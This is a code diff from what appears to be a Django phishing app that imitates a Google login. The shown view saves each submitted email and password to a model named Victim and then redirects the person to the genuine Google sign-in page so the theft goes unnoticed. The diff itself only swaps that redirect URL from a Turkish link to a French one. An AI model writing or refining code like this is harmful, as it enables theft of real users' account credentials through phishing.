@@ -50,7 +50,7 @@ def google_show(request):
                 # Enregistrement des données
                 trap = Victim(email=email, password=password)
                 trap.save()
-                return redirect('https://accounts.google.com/InteractiveLogin/signinchooser?continue=https%3A%2F%2Fwww.google.com%2F&ec=GAZAmgQ&hl=tr&passive=true&ifkv=AVQVeyzlnmLJTmZibmoikdTTu_5Erw5RP_4BV2m08eph1vOJMAeSiGq3a61-pqTUpwHfjZiV0zkq-A&theme=glif&flowName=GlifWebSignIn&flowEntry=ServiceLogin')
+                return redirect('https://accounts.google.com/InteractiveLogin/identifier?continue=https%3A%2F%2Fwww.google.com%2F%3Fhl%3Dfr%26pli%3D1&ec=GAZAmgQ&hl=fr&passive=true&ifkv=ASKXGp3LkqV2-XMQk5XIrJbsOeGT5iJTyoyj5-zM1EZVjOaNNLeOjQB3ZNkydghDbdM59O8smJw0MA&theme=glif&flowName=GlifWebSignIn&flowEntry=ServiceLogin')
 
         else:
             messages.error(request, "Both of the two fields are required")# Affichage d'un message d'erreur si les champs sont vides
